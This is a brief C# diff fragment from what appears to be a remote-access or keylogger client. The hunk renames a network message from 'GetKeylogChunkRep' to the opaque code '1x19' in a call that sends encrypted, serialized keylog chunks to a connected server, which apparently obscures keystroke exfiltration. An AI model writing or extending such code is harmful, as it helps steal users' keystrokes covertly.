@@ -30,7 +30,7 @@ namespace Client.Core.Events
 
                 if (NetworkManager.IsConnected)
                 {
-                    NetworkManager.Connection.SendObject("GetKeylogChunkRep",
+                    NetworkManager.Connection.SendObject("1x19",
                         Cryptography.Encrypt(JsonConvert.SerializeObject(linesRequested)));
                 }
                 else
